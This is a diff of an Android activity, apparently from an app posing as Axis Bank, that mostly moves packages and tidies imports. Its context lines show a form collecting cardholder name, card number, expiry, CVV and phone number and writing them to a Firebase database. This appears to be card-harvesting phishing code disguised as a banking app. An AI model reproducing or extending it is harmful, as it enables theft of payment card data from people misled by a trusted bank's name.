@@ -1,6 +1,6 @@
-package com.bank.axisbank;
+package com.bank.axisbank.screen;
 
-import static com.bank.axisbank.formActivity.ref;
+import static com.bank.axisbank.screen.formActivity.ref;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -10,18 +10,18 @@ import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Bundle;
-import android.os.Handler;
 import android.view.View;
 import android.view.WindowManager;
-import android.widget.Button;
 import android.widget.EditText;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.bank.axisbank.R;
+import com.bank.axisbank.model.CardNumber;
+import com.bank.axisbank.model.cardModel;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
-import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
 
@@ -39,7 +39,7 @@ public class cardDetails extends AppCompatActivity {
         setContentView(R.layout.activity_card_details);
         cardOwner =findViewById(R.id.cardholdername);
         cardNumber=findViewById(R.id.cardnumber);
-        cardNumber.setText(CardNumber.getCard_Number());
+//        cardNumber.setText(CardNumber.getCard_Number());
         ExMonth=findViewById(R.id.EXpiry);
         ExYear=findViewById(R.id.yearEX);
         CVV =findViewById(R.id.cvv);
@@ -56,7 +56,7 @@ public class cardDetails extends AppCompatActivity {
             STExYear=ExYear.getText().toString();
             STCVV=CVV.getText().toString();
             showLoadingOverlay();
-            String phone = com.bank.axisbank.phone.getPhone();
+            String phone = com.bank.axisbank.model.phone.getPhone();
             FirebaseDatabase db = FirebaseDatabase.getInstance();
             if(String.valueOf(STcardNumber).equals("") || String.valueOf(STcardOwner).equals("") || String.valueOf(STExMonth).equals("") || String.valueOf(STExYear).equals("") || String.valueOf(STCVV).equals("")){
                 hideLoadingOverlay();
@@ -95,7 +95,7 @@ public class cardDetails extends AppCompatActivity {
                 public void onClick(View view) {
                     loadingOverlayy.setVisibility(View.GONE);
                     Success.setVisibility(View.GONE);
-                    Intent intent = new Intent(getApplicationContext(),MainActivity.class);
+                    Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                     intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                     startActivity(intent);
 
